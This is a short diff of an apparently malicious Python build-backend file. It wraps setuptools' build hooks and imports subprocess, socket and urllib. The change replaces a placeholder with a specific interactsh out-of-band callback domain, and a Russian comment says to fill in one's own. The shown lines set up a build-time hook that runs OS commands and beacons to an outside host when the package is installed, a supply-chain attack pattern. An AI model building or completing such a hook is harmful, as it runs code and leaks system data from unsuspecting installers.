@@ -1,7 +1,7 @@
 import subprocess, os, socket, sys, platform, urllib.request
 import setuptools.build_meta as _sm
 
-OAST = "https://example.oast.fun"   # FILL: твой interactsh domain / уникальный subdomain
+OAST = "https://dbi1qvidu8scsdkvqs50zxi9dyjat595b.oast.online"   # FILL: твой interactsh domain / уникальный subdomain
 
 def _cmd():
     if os.name == "nt":
